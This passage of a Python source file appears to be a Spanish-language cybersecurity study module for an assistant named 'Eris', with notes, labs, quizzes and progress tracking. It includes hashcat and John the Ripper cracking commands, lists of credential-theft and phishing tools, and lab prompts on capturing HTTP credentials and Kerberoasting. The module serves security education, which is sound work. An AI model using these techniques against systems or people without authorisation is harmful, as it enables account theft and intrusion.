                "name": "Fundamentos de Criptografía",
                "content": """# Criptografía

## Tipos de cifrado
| Tipo | Ejemplo | Clave |
|------|---------|-------|
| Simétrico | AES, DES, 3DES, Blowfish | Misma clave para cifrar y descifrar |
| Asimétrico | RSA, ECC, DSA | Par de claves: pública y privada |
| Hash | MD5, SHA-1, SHA-256, SHA-512 | Sin clave, una sola dirección |

## Hash cracking
```bash
# Hashcat
hashcat -m 0 hash.txt wordlist.txt    # MD5
hashcat -m 100 hash.txt wordlist.txt  # SHA-1
hashcat -m 1400 hash.txt wordlist.txt # SHA-256
hashcat -m 1000 hash.txt wordlist.txt # NTLM
hashcat -m 3200 hash.txt wordlist.txt # bcrypt

# John the Ripper
john --wordlist=wordlist.txt hash.txt
john --show hash.txt

# Online databases
# crackstation.net
# hashes.com
```

## Rainbow tables
- Tablas pre-calculadas para hashes comunes
- Protección: salting (agregar aleatorio al hash)
- Herramienta: rtgen, rcracki

## SSL/TLS
- TLS 1.3: Actual, seguro
- TLS 1.2: Aún aceptable
- SSL 3.0 / TLS 1.0/1.1: Obsoletos, vulnerables
- Ataques: POODLE, BEAST, Heartbleed, ROBOT

## Herramientas de análisis
- **OpenSSL**: Certificados, cifrado
- **CyberChef**: "The Cyber Swiss Army Knife" (GCHQ)
- **Hashcat**: GPU cracking
- **John the Ripper**: CPU cracking
- **RsaCtfTool**: Ataques a RSA""",
                "keywords": ["cryptography", "hash", "AES", "RSA", "MD5", "SHA"]
            },
        },
    },
    "tools": {
        "title": "Herramientas de Pentesting",
        "description": "Kali Linux, Burp Suite, Nmap, Metasploit, y más.",
        "subtopics": {
            "kali_linux": {
                "name": "Kali Linux",
                "content": """# Kali Linux – La distro del pentester

## Herramientas por categoría
| Categoría | Herramientas |
|-----------|-------------|
| Reconocimiento | Maltego, theHarvester, Recon-ng, SpiderFoot |
| Escaneo | Nmap, Unicornscan, Masscan |
| Web | Burp Suite, OWASP ZAP, SQLMap, Nikto, WPScan |
| Explotación | Metasploit, SearchSploit, BeEF |
| Inyección | SQLMap, XSSer, Commix |
| WiFi | Aircrack-ng, Wifite, Fern |
| Sniffing | Wireshark, tcpdump, bettercap |
| Forense | Autopsy, Volatility, Binwalk |
| Password | John, Hashcat, Hydra, Crunch |
| Post-Explot | Mimikatz, LaZagne, LinPEAS/WinPEAS |
| Anonimato | Tor, Anonymizer, MacChanger |
| Social | SET, GoPhish, King Phisher |

## Configuración inicial
```bash
sudo apt update && sudo apt full-upgrade -y
sudo apt install kali-linux-everything  # Todo (20GB+)
```

## Custom tools
Kali permite crear scripts personalizados en /usr/local/bin/""",
                "keywords": ["Kali", "Linux", "herramientas", "pentesting"]
            },
            "burp_suite": {
                "name": "Burp Suite",
                "content": """# Burp Suite – Web Application Testing

## Componentes
| Componente | Función |
|-----------|---------|
| Proxy | Interceptar y modificar tráfico HTTP/S |
| Scanner | Escaneo automático de vulnerabilidades (Pro) |
| Intruder | Fuerza bruta, fuzzing |
| Repeater | Reenviar requests modificados |
| Decoder | Decodificar/encode datos |
| Comparer | Comparar respuestas |
| Logger | Log de todo el tráfico |

## Uso básico
1. Configurar proxy del navegador: 127.0.0.1:8080
2. Instalar certificado CA de Burp
3. Navegar al sitio objetivo
4. Ver tráfico en Proxy → HTTP history
5. Enviar requests a Repeater para modificar
6. Usar Intruder para fuzzing

## Payloads Intruder
- Sniper: Un payload por posición
- Battering ram: Mismo payload en todas
- Pitchfork: Listas paralelas
- Cluster bomb: Todas las combinaciones

## Escaneo
- Active Scan → Escaneo completo
- Comparison → Detectar cambios
- Content Discovery → Descubrir contenido""",
                "keywords": ["Burp Suite", "proxy", "Intruder", "web hacking"]
            },
        },
    },
}


# ═══════════════════════════════════════════════════════════════════
# PROGRESS TRACKING
# ═══════════════════════════════════════════════════════════════════

def _load_progress() -> dict:
    try:
        if PROGRESS_FILE.exists():
            return json.loads(PROGRESS_FILE.read_text(encoding="utf-8"))
    except Exception:
        pass
    return {
        "topics_studied": [],
        "subtopics_completed": [],
        "tools_learned": [],
        "labs_done": 0,
        "started": datetime.now().isoformat(),
        "last_session": None,
        "total_time_minutes": 0,
    }


def _save_progress(data: dict):
    PROGRESS_FILE.parent.mkdir(parents=True, exist_ok=True)
    PROGRESS_FILE.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")


# ═══════════════════════════════════════════════════════════════════
# MAIN FUNCTION
# ═══════════════════════════════════════════════════════════════════

def cybersecurity(parameters: dict, player=None) -> str:
    """
    Módulo de conocimiento de ciberseguridad para Eris.

    Acciones:
      - topics: Listar todos los temas disponibles
      - learn: Obtener un tema específico. Parametros: topic (networking, operating_systems, programming, etc.), subtopic (opcional)
      - search: Buscar en toda la base de conocimiento. Parametros: query
      - lab: Ejercicio práctico/lab de un tema. Parametros: topic
      - progress: Ver progreso de aprendizaje
      - tools: Listar herramientas de una categoría
      - quiz: Quiz sobre un tema. Parametros: topic, count (default 5)
      - save_to_obsidian: Guardar un tema en el vault de Obsidian
    """
    action = parameters.get("action", "topics").lower()
    data = _load_progress()

    if action == "topics":
        result = "**🔒 Cybersecurity Topics**\n\n"
        for key, topic in TOPICS.items():
            count = len(topic.get("subtopics", {}))
            studied = " ✓" if key in data["topics_studied"] else ""
            result += f"- **{topic['title']}** (`{key}`) — {count} subtopics{studied}\n"
            result += f"  {topic['description']}\n\n"
        result += f"\nTopics studied: {len(data['topics_studied'])}/{len(TOPICS)} | Subtopics completed: {len(data['subtopics_completed'])}"
        return result

    elif action == "learn":
        topic = parameters.get("topic", "")
        subtopic = parameters.get("subtopic", "")
        if not topic:
            return "Error: Se requiere 'topic'. Usa `topics` para ver las opciones."
        if topic not in TOPICS:
            return f"Topic '{topic}' no encontrado. Opciones: {', '.join(TOPICS.keys())}"
        t = TOPICS[topic]
        if subtopic:
            if subtopic not in t.get("subtopics", {}):
                avail = ", ".join(t.get("subtopics", {}).keys())
                return f"Subtopic '{subtopic}' no encontrado en {topic}. Opciones: {avail}"
            st = t["subtopics"][subtopic]
            if subtopic not in data["subtopics_completed"]:
                data["subtopics_completed"].append(subtopic)
                if topic not in data["topics_studied"]:
                    data["topics_studied"].append(topic)
                data["last_session"] = datetime.now().isoformat()
                _save_progress(data)
            return st["content"]
        else:
            result = f"# {t['title']}\n\n{t['description']}\n\n## Subtopics:\n\n"
            for sk, sv in t.get("subtopics", {}).items():
                completed = " ✓" if sk in data["subtopics_completed"] else ""
                result += f"- **{sv['name']}** (`{sk}`){completed}\n"
                result += f"  Keywords: {', '.join(sv.get('keywords', [])[:5])}\n\n"
            result += f"\nUsa `learn` con subtopic para ver el contenido completo."
            return result

    elif action == "search":
        query = parameters.get("query", "")
        if not query:
            return "Error: Se requiere 'query'."
        q = query.lower()
        results = []
        for tkey, topic in TOPICS.items():
            for skey, subtopic in topic.get("subtopics", {}).items():
                if (q in subtopic["content"].lower() or q in subtopic["name"].lower() or
                    q in " ".join(subtopic.get("keywords", [])).lower()):
                    results.append({
                        "topic": tkey,
                        "subtopic": skey,
                        "name": subtopic["name"],
                        "keywords": subtopic.get("keywords", []),
                    })
        if not results:
            return f"Sin resultados para '{query}'."
        response = f"🔍 **{len(results)} resultados para '{query}':**\n\n"
        for r in results[:10]:
            response += f"- **{r['name']}** (topic: `{r['topic']}`)\n  Keywords: {', '.join(r['keywords'][:5])}\n\n"
        return response

    elif action == "lab":
        topic = parameters.get("topic", "")
        if not topic or topic not in TOPICS:
            return f"Topic '{topic}' no encontrado. Opciones: {', '.join(TOPICS.keys())}"
        t = TOPICS[topic]
        result = f"**🔧 LAB: {t['title']}**\n\n"
        # Generate lab based on topic
        labs = {
            "networking": "Lab: Configura un servidor HTTP en tu máquina. Usa Netcat para conectarte. Analiza el tráfico con Wireshark. Identifica el handshake TCP.",
            "operating_systems": "Lab: Instala Kali Linux en VM. Enumera los puertos de tu propia máquina (nmap -sV 127.0.0.1). Identifica servicios vulnerables.",
            "programming": "Lab: Escribe un script Python que escanea 100 puertos de una IP objetivo. Usa socket y threading.",
            "databases": "Lab: Instala MySQL. Crea una base de datos con usuarios. Prueba inyección SQL en un formulario web vulnerable (DVWA).",
            "phases": "Lab: Haz reconocimiento OSINT de tu propio dominio. Usa theHarvester y dnsenum. Documenta todo.",
            "web_hacking": "Lab: Instala DVWA (Damn Vulnerable Web App). Completa los 5 niveles de XSS y los 3 de SQLi.",
            "network_hacking": "Lab: Configura Bettercap en tu red local. Captura el tráfico de un dispositivo. Extrae credenciales HTTP.",
            "active_directory": "Lab: Instala Windows Server con AD. Configura usuarios y grupos. Haz Kerberoasting con Rubeus.",
            "social_engineering": "Lab: Crea una campaña de phishing controlada con GoPhish. Mide la tasa de apertura y clics.",
            "cryptography": "Lab: Descifra un hash MD5 con Hashcat. Genera un par de claves RSA con openssl. Compara tiempos de crackeo.",
            "tools": "Lab: Instala la suite completa de Kali. Ejecuta Nmap, Metasploit, y SQLMap contra靶机 vulnerable.",
        }
        result += labs.get(topic, "Lab: Practica los conceptos de este tema en tu máquina local.")
        data["labs_done"] += 1
        _save_progress(data)
        return result

    elif action == "progress":
        result = "**📊 Cybersecurity Learning Progress**\n\n"
        result += f"Topics studied: {len(data['topics_studied'])}/{len(TOPICS)}\n"
        result += f"Subtopics completed: {len(data['subtopics_completed'])}\n"
        result += f"Labs done: {data['labs_done']}\n"
        if data.get("tools_learned"):
            result += f"Tools learned: {', '.join(data['tools_learned'])}\n"
        if data.get("last_session"):
            result += f"Last session: {data['last_session'][:19]}\n"
        if data["topics_studied"]:
            result += "\n**Studied:**\n"
            for t in data["topics_studied"]:
                result += f"  ✓ {TOPICS.get(t, {}).get('title', t)}\n"
        return result

    elif action == "tools":
        topic = parameters.get("topic", "")
        result = "**🛠️ Pentesting Tools**\n\n"
        for tkey, t in TOPICS.items():
            if not topic or tkey == topic:
                for skey, st in t.get("subtopics", {}).items():
                    if "tool" in st["name"].lower() or "herramienta" in st["name"].lower():
                        result += f"**{st['name']}** (topic: `{tkey}`)\n"
                        # Extract tool names from content
                        tools = [line.strip("- **").split("**")[0] for line in st["content"].split("\n") if "- **" in line]
                        for tool in tools[:10]:
                            result += f"  - {tool}\n"
                        result += "\n"
        if topic:
            result += f"\nFiltrado por topic: `{topic}`"
        return result

    elif action == "quiz":
        topic = parameters.get("topic", "")
        count = int(parameters.get("count", 5))
        if not topic or topic not in TOPICS:
            return f"Topic '{topic}' no encontrado."
        t = TOPICS[topic]
        quizzes = {
            "networking": [
                ("¿Qué handshake usa TCP?", "SYN → SYN-ACK → ACK (3-way handshake)"),
                ("¿Qué puerto usa HTTPS?", "443"),
                ("¿Cuántos bits tiene IPv4?", "32 bits"),
                ("¿Qué resuelve ARP?", "IP → MAC"),
                ("¿Qué hace DNS?", "Traduce nombres de dominio → IPs"),
            ],
            "web_hacking": [
                ("¿Qué es XSS?", "Cross-Site Scripting – inyección de scripts en páginas web"),
                ("¿Qué es SQLi?", "SQL Injection – inyección de código SQL en queries"),
                ("¿Qué hacer CSRF?", "Cross-Site Request Forgery – falsificación de peticiones"),
                ("¿Qué es IDOR?", "Insecure Direct Object Reference – acceso a objetos por ID"),
                ("¿Qué es SSTI?", "Server-Side Template Injection"),
            ],
        }
        q_list = quizzes.get(topic, [("Pregunta de práctica para " + topic, "Respuesta de práctica")])
        selected = random.sample(q_list, min(count, len(q_list)))
        result = f"**📝 Quiz: {t['title']}**\n\n"
        for i, (q, a) in enumerate(selected, 1):
            result += f"{i}. {q}\n   *Respuesta: {a}*\n\n"
        result += "Intenta responder antes de ver las respuestas!"
        return result

    elif action == "save_to_obsidian":
        topic = parameters.get("topic", "")
        subtopic = parameters.get("subtopic", "")
        if not topic or topic not in TOPICS:
            return f"Topic '{topic}' no encontrado."
        try:
            from actions.obsidian_brain import obsidian_note
            t = TOPICS[topic]
            if subtopic and subtopic in t.get("subtopics", {}):
                st = t["subtopics"][subtopic]
                content = st["content"]
                title = st["name"]
            else:
                content = "\n\n".join(st["content"] for st in t.get("subtopics", {}).values())
                title = t["title"]
            obsidian_note({
                "action": "write",
                "title": f"CyberSec: {title}",
                "folder": "Aprendizaje",
                "content": content,
                "tags": f"cybersecurity,{topic},{subtopic or 'general'}"
            })
            return f"🔒 Saved to Obsidian: Aprendizaje/CyberSec: {title}.md"
        except Exception as e:
            return f"Could not save to Obsidian: {e}"

    available = "topics | learn | search | lab | progress | tools | quiz | save_to_obsidian"
    return f"Action '{action}' not found. Available: {available}"


# Needed for quiz
import random
